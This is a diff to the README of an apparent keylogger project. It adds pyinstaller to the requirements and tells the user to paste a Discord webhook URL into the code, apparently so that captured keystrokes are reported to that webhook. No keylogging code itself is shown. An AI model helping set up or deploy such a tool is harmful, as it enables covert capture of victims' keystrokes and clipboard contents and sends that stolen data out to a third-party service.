@@ -3,6 +3,7 @@ Keylogger with Discord Webhooks reports
 
 ## Requirements
 ```py
+pyinstaller
 clipboard
 pyperclip
 requests
@@ -14,4 +15,8 @@ argparse
 Install requirements with
 ```batch
 pip install -r requirements.txt
+```
+Makes changes to line 23 with your discord webhook
+```python
+webhook = "https://discord.com/api/webhooks/..."
 ```
